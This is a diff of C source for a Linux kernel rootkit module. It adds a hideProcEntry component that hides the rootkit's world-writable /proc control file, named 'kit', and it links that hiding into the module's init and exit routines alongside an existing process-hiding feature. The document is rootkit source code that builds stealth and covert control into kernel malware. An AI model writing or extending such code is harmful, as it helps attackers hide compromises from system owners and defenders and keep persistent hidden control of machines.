@@ -7,6 +7,7 @@
 
 #include "communication.h"
 #include "processHider.h"
+#include "hideProcEntry.h"
 #include "common.h"
 
 //TODO: ensure its possible to communicate with the rootkit without being root
@@ -19,7 +20,7 @@
 #define PROC_ENTRY_MODE    0222
 
 //TODO: rename this
-static const char *PROC_FILE_NAME = "kit";
+static const char *PROC_FILE_NAME = PROC_ENTRY;
 
 // Function prototyps
 static ssize_t receiveWrite(struct file *, const char __user *, size_t, loff_t *);
@@ -40,17 +41,24 @@ static const struct file_operations proc_file_fops = {
 
 
 int communication_init(void) {
+	int error;
+
 	proc_file_entry = proc_create(PROC_FILE_NAME, PROC_ENTRY_MODE, PARENT_PROC_ENTRY, &proc_file_fops);
 
 	if (proc_file_entry == NULL) {
 		return -ENOMEM;
 	}
 
-	return 0;
+	error = hideProcEntry_init();
+
+
+	return error;
 }
 
 void communication_exit(void) {
 	remove_proc_entry(PROC_FILE_NAME, PARENT_PROC_ENTRY);
+
+	hideProcEntry_exit(); //note if this starts to depend on the proc entry ensure this is run BEFORE REMOVING THE PROC ENTRY
 }
 
 #define ROOTKIT_BUFFER_LENGTH 100
